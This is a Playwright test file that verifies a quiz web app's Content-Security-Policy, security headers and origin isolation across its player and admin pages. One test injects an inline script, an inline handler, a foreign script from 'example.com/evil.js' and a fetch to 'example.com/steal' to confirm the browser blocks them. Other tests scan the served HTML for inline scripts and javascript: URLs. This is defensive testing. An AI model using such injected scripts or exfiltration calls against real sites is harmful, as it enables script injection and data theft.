/**
 * (9) CSP and console hygiene.
 *  - every HTML entry point is served with the strict policy and the companion security headers;
 *  - the served HTML has no inline script and no inline event handler;
 *  - the policy is really ENFORCED by the browser (inline script, inline handler, foreign script and foreign connection
 *    are blocked; `unsafe-eval` is absent from the header, checked above);
 *  - a sweep over every page of the three apps produces no console error, no CSP violation, no uncaught exception, and no
 *    request leaves the origin.
 * (The `guard` fixture applies the "no console error / CSP violation" rule to EVERY test of the suite; this file makes it explicit.)
 */
import { test, expect, onlyInFirstProject, type TestEvent } from '../support/fixtures';
import { playViaApi } from '../support/api';
import { gotoAdmin, gotoTab } from '../support/admin';
import { openEvent, registerUpToRules, startGame, playByKeyboard, readResults, switchLang } from '../support/ui';
import type { Page } from '@playwright/test';

let ev: TestEvent;
test.beforeAll(async ({ events }) => {
  ev = await events.create({ tag: 'csp', questions: 6, perGame: 3, timer: 20, twoChoices: 1 });
  await playViaApi(ev.slug, { first_name: 'Csp', last_name: 'Checker', green: 3 });
});

const entryPoints = (slug: string) => ['/', `/${slug}`, `/${slug}/scoreboard`, '/a/b/c', '/admin/'];

test.describe('headers of the HTML entry points', () => {
  onlyInFirstProject();

  test('strict Content-Security-Policy and companion headers everywhere', async ({ request }) => {
    for (const path of entryPoints(ev.slug)) {
      const res = await request.get(path);
      const h = res.headers();
      const csp = h['content-security-policy'] || '';
      expect(csp, `CSP on ${path}`).toContain("default-src 'self'");
      const script = csp.split(';').map((d) => d.trim()).find((d) => d.startsWith('script-src')) || '';
      expect(script, `script-src on ${path}`).toBe("script-src 'self'");
      expect(csp, `no eval / inline allowance on ${path}`).not.toMatch(/unsafe-eval|script-src[^;]*unsafe-inline/);
      expect(csp).toContain("frame-ancestors 'self'");
      expect(csp).toContain("base-uri 'self'");
      expect(csp).toContain("form-action 'self'");
      expect(csp).toMatch(/connect-src 'self'/);
      expect(h['x-content-type-options'], `nosniff on ${path}`).toBe('nosniff');
      expect(h['x-frame-options'], `X-Frame-Options on ${path}`).toBe('SAMEORIGIN');
      expect(h['referrer-policy'], `Referrer-Policy on ${path}`).toBeTruthy();
    }
  });

  test('scripts and styles are served as the right type, HTML is revalidated', async ({ request }) => {
    const js = await request.get('/js/hub.js');
    expect(js.headers()['content-type']).toMatch(/javascript/);
    expect(js.headers()['cache-control']).toContain('no-cache');
    const css = await request.get('/shared/css/tokens.css');
    expect(css.headers()['content-type']).toMatch(/text\/css/);
    const font = await request.get('/shared/fonts/inter-latin.woff2');
    expect(font.headers()['cache-control']).toMatch(/immutable/);
  });

  test('the served HTML has no inline script and no inline event handler', async ({ request }) => {
    for (const path of entryPoints(ev.slug)) {
      const html = await (await request.get(path)).text();
      expect(html, `inline <script> on ${path}`).not.toMatch(/<script(?![^>]*\bsrc=)[^>]*>/i);
      expect(html, `inline handler on ${path}`).not.toMatch(/<[a-z][^>]*\son[a-z]+\s*=/i);
      expect(html, `javascript: URL on ${path}`).not.toMatch(/(href|src|action)\s*=\s*["']\s*javascript:/i);
    }
  });
});

test.describe('the browser enforces the policy', () => {
  // the violations are the whole point of this test
  test.use({ expectedConsole: /E2E_CSP_VIOLATION|Content Security Policy|Refused to|violates|blocked/i });

  test('inline script, inline handler, foreign script and foreign connection are all blocked', async ({ page }) => {
    const violations: string[] = [];
    page.on('console', (m) => { if (m.text().startsWith('E2E_CSP_VIOLATION')) violations.push(m.text()); });
    await openEvent(page, ev.slug);

    const outcome = await page.evaluate(async () => {
      const w = window as any;
      const out: Record<string, unknown> = {};
      const s = document.createElement('script'); s.textContent = 'window.__csp_inline = 1'; document.head.append(s);
      const d = document.createElement('div'); d.setAttribute('onclick', 'window.__csp_handler = 1'); document.body.append(d); d.click();
      const f = document.createElement('script'); f.src = 'https://example.com/evil.js'; document.head.append(f);
      try { await fetch('https://example.com/steal', { mode: 'no-cors' }); out.fetch = 'allowed'; } catch (e: any) { out.fetch = 'blocked'; }
      await new Promise((r) => setTimeout(r, 300));
      out.flags = { inline: w.__csp_inline, handler: w.__csp_handler };
      return out;
    });
    expect(outcome.flags).toEqual({ inline: undefined, handler: undefined });
    expect(outcome.fetch).toBe('blocked');
    expect(violations.length, `violations reported: ${violations.join(' | ')}`).toBeGreaterThanOrEqual(3);
  });
});

/** Record every request that leaves the origin of the stack under test (data: and blob: are local). */
async function sweep(page: Page, label: string) {
  const foreign: string[] = [];
  page.on('request', (r) => {
    const u = new URL(r.url());
    if (u.protocol === 'data:' || u.protocol === 'blob:') return;
    // img-src allows https: on purpose (an event can show its own logo): a broken logo URL typed in some other event
    // is the admin's data. Everything else (scripts, styles, fonts, XHR / fetch / SSE) must stay on the origin.
    if (r.resourceType() === 'image') return;
    if (u.origin !== new URL(process.env.BASE_URL || 'http://localhost:8080').origin) foreign.push(`${label}: ${r.method()} ${r.url()}`);
  });
  return foreign;
}

test.describe('page sweep: nothing in the console, nothing leaves the origin', () => {
  test('hub, landing, registration, rules, game, results, review, scoreboard, 404 (EN, FR, both themes)', async ({ page }) => {
    test.setTimeout(90_000);
    const foreign = await sweep(page, 'player app');

    await page.goto('/?theme=dark');
    await expect(page.locator('article.hub-card').first()).toBeVisible();
    await page.goto('/?theme=light&lang=fr');
    await expect(page.locator('article.hub-card').first()).toBeVisible();

    await openEvent(page, ev.slug, '?theme=light');
    await switchLang(page, 'fr');
    await switchLang(page, 'en');
    await registerUpToRules(page, { first: 'Sweep', last: 'Test' });
    await startGame(page);
    await playByKeyboard(page, ['g', 'r', 'g']);
    await readResults(page);
    await page.locator('[data-action="review"]').click();
    await expect(page.locator('main[data-view="review"]')).toBeVisible();
    await switchLang(page, 'fr');

    for (const query of ['', '?rotate=1', '?lang=fr&theme=light&limit=3', '?qr=0&limit=20']) {
      await page.goto(`/${ev.slug}/scoreboard${query}`);
      await expect(page.locator('#sb')).toHaveAttribute('data-state', 'ready');
    }
    expect(foreign, 'requests to another origin').toEqual([]);
  });

  test.describe('404 page', () => {
    test.use({ expectedConsole: /status of 404/ }); // the browser logs the 404 status of the document itself
    test('the branded 404 page is clean too', async ({ page }) => {
      const foreign = await sweep(page, '404');
      const res = await page.goto('/a/b/c');
      expect(res?.status()).toBe(404);
      await expect(page.getByRole('heading', { name: /Page not found|Page introuvable/ })).toBeVisible();
      expect(foreign).toEqual([]);
    });
  });

  test.describe('admin', () => {
    test.use({ asAdmin: true });
    test('events list and every event tab', async ({ page }) => {
      const foreign = await sweep(page, 'admin');
      await gotoAdmin(page, '#/events');
      await expect(page.locator('article.admin-event').first()).toBeVisible();
      for (const tab of ['overview', 'questions', 'categories', 'results', 'settings', 'appearance'] as const) await gotoTab(page, ev, tab);
      expect(foreign, 'requests to another origin').toEqual([]);
    });
  });

  test('admin login screen', async ({ page }) => {
    const foreign = await sweep(page, 'login');
    await gotoAdmin(page, '#/login');
    await expect(page.getByRole('heading', { name: 'Quiz Admin' })).toBeVisible();
    expect(foreign, 'requests to another origin').toEqual([]);
  });
});
